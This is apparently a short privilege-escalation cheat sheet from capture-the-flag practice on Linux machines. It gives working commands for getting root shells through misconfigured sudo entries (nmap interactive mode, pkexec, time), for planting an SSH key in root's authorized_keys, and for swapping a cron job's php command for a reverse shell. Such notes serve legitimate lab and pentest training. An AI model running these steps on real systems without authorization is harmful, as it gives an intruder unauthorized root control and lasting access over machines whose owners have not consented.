### Privilege Escalation

#### If you have found any passwords on the machine, try running as root
```
sudo su
```
#### Check which commands sudo can run
``` 
sudo -l

# If you get something like 
# User asterisk may run the following commands on this host:
#    (root) NOPASSWD: /sbin/shutdown
#    (root) NOPASSWD: /usr/bin/nmap
# Google the application you can run as root, eg. nmap privilege escalation
sudo nmap --interactive
nmap> !sh
```
```
# If you get something like
User tony may run the following commands on funbox3:
    (root) NOPASSWD: /usr/bin/rlogin
    (root) NOPASSWD: /usr/bin/pkexec
    (root) NOPASSWD: /usr/bin/mtr
    (root) NOPASSWD: /usr/bin/finger
    (root) NOPASSWD: /usr/bin/time
# Try the following
tony@funbox3:~$ sudo /usr/bin/pkexec /bin/sh
$ whoami
root

# Can also do.. Just make sure the application is there with 'which time'
tony@funbox3:~$ sudo /usr/bin/time /bin/sh
$ whoami
root
``` 
#### Check which version/year of Linux for privesc exploits
```
uname -a
```

#### If you can modify files as root
#### Try to add ssh public key to root/.ssh/authorized_keys
```
# Generate ssh key pair
ssh-keygen -o

# Copy the public key
cat /root/.ssh/id_rsa.pub

# Paste it into your root/.ssh/authorized_keys file (create if necessary)
# Then try and access through ssh from attacking machine
ssh root@targetip
```

#### Check the crontab for cron jobs you can exploit
```
cat /etc/crontab
# If you locate a cron job with a php command, replace it with a php reverse shell
```
